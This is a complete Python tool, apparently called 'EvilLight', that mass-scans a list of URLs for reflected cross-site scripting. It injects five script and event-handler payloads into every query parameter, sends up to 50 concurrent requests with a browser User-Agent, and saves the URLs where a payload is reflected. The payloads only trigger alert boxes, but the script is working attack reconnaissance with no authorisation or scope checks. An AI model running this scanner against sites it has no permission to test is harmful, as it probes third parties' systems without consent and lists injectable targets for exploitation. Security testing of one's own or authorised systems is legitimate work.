import aiohttp
import asyncio
import urllib.parse
import argparse
from colorama import init, Fore

init()

rd = Fore.RED
g = Fore.GREEN
reset = Fore.RESET

parse = argparse.ArgumentParser(description="EvilLight - vacpXSS")
parse.add_argument('-f', help='File with URLs to scan')
parse.add_argument('-o', default='xss_evillight.txt', help='Write found URLs to .txt')
parse.add_argument('-c', default=50, type=int, help='Number of concurrent connections (default=50)')
args = parse.parse_args()

payloads = [
    "<script>alert('XSS')</script>",
    "<img src=x onerror=alert('XSS')>",
    "<svg/onload=alert('XSS')>",
    "javascript:alert('XSS')>",
    "<body onload=alert('XSS')>",
]

found_urls = []
sem = asyncio.Semaphore(args.c)


async def fetch(session, url, payload):
    url = url.strip()
    url_parsed = urllib.parse.urlparse(url)
    qs = urllib.parse.parse_qsl(url_parsed.query)

    if not qs:
        return

    injected_qs = [(k, payload) for k, _ in qs]
    new_query = urllib.parse.urlencode(injected_qs)
    full_url = urllib.parse.urlunparse(url_parsed._replace(query=new_query))

    headers = {'User-Agent': "Mozilla/5.0"}

    async with sem:
        try:
            async with session.get(full_url, headers=headers, timeout=10) as response:
                text = await response.text()
                if payload in text:
                    print(f"{rd}[XSS FOUND] {full_url}{reset}")
                    found_urls.append(full_url)
        except Exception:
            pass

async def main():
    with open(args.f, 'r') as f:
        urls = f.readlines()

    async with aiohttp.ClientSession() as session:
        tasks = []
        for url in urls:
            for payload in payloads:
                tasks.append(fetch(session, url, payload))
        await asyncio.gather(*tasks)

    print(f"{g}\nScan complete. XSS Found: {len(found_urls)}{reset}")
    with open(args.o, 'w') as f:
        for url in found_urls:
            f.write(url + "\n")


if __name__ == "__main__":
    asyncio.run(main())
